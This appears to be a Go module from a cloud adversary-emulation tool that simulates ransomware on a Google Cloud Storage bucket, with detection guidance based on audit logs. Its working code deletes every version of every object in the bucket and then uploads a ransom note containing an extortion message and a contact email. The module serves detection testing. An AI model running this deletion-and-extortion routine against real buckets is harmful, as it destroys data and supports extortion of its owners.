package gcp

import (
    "context"
    _ "embed"
    "fmt"
    "log"
    "time"
    "cloud.google.com/go/storage"
    gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus"
    "github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const RansomNoteFilename = `FILES-DELETED.txt`
const RansomNoteContents = `Your data is backed up in a safe location. To negotiate with us for recovery, get in touch with xathrya@reversing.id. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable.`


func init() {
    const CodeBlock = "```"
    const AttackTechniqueId = "gcp.impact.gcs-ransomware-individual-deletion"

    stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
        ID:           AttackTechniqueId,
        FriendlyName: "GCS Ransomware through individual deletion",
        Description: `
Simulates ransomware activity that empties a bucket through individual file deletion, then uploads a ransom note.

Warm-up:

- Create a cloud storage bucket with versioning enabled
- Create a number of files in the bucket, with random content and extensions

Detonation:

- List all available objects and their versions in the bucket
- Delete all objects in the bucket one by one, using [Objects:delete](https://cloud.google.com/storage/docs/json_api/v1/objects/delete)
- Upload a ransom note to the bucket

Note: The attack does not need to disable versioning, which does not protect against ransomware. This attack removes all versions of the objects in the bucket.

References:

- [Ransomware in the cloud](https://invictus-ir.medium.com/ransomware-in-the-cloud-7f14805bbe82)
- https://www.firemon.com/what-you-need-to-know-about-ransomware-in-aws/
- https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/
`,
        Detection: `
You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket.
In general, this can be done through Cloud Logging for storage.objects.delete and storage.objects.get events.

Data Access logging for GCS bucket is disabled by default, thus we need to enable it (if not enabled).

- Go to "IAM & Admin" -> "Audit Logs"
- Locate "Google Cloud Storage"
- on "Permission Types", check the "Data write"

Sample event (shortened for readability):

` + CodeBlock + `json
{
  "logName": "projects/my-project-id/logs/cloudaudit.googleapis.com%2Fdata_access",
  "protoPayload": {
    "authenticationInfo": {
      "principalEmail": "username@service.com",
    },
      "methodName": "storage.objects.delete",
      "resourceName": "projects/_/buckets/my-bucket-name/objects/my-object-name.extension",
      "serviceName": "storage.googleapis.com",
  },
  "resource": {
      "type": "gcs_bucket",
  },
  "severity": "INFO",
}
` + CodeBlock + `
`,
        Platform:                   stratus.GCP,
        IsIdempotent:               false,
        MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
        PrerequisitesTerraformCode: tf,
        Detonate:                   detonate,
    })
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
    gcp := providers.GCP()
    ctx := context.Background()

    // result from terraform
    bucketName := params["bucket_name"]

    log.Println("Simulating a ransomware attack on bucket " + bucketName)

    // get the client
    client, err := storage.NewClient(ctx, gcp.Options())
    if err != nil {
        return fmt.Errorf("unable to create new client: %w", err)
    }
    defer client.Close()

    // get the bucket
    bucket := client.Bucket(bucketName)

    // download all objects
    if err := removeAllObjects(bucket, ctx); err != nil {
        return fmt.Errorf("failed to remove objects in the bucket: %w", err)
    }

    // upload ransom note
    log.Println("uploading ransom note")
    content := []byte(RansomNoteContents)
    if _, err := gcp_utils.WriteBucketObject(bucket, ctx, RansomNoteFilename, content); err != nil {
        return fmt.Errorf("failed to upload ransom note to the bucket: %w", err)
    }

    return nil
}

func removeAllObjects(bucket *storage.BucketHandle, ctx context.Context) error {
    // get the objects and its version
    objects, err := gcp_utils.ListAllObjectVersions(bucket, ctx)
    if err != nil {
        return fmt.Errorf("unable to list bucket objects: %w", err)
    }

    log.Printf("found %d object versions to delete", len(objects))
    log.Println("removing all objects one by one individually")

    // remove all objects
    ctx, cancel := context.WithTimeout(ctx, 30 * time.Second)
    defer cancel()

    for _, object := range objects {
        obj := bucket.Object(object.Name)
        if err := obj.Generation(object.Generation).Delete(ctx); err != nil {
            return fmt.Errorf("unable to delete file %s: %w", object.Name, err)
        }
    }

    log.Println("successfully removed all objects from the bucket")
    return nil
}
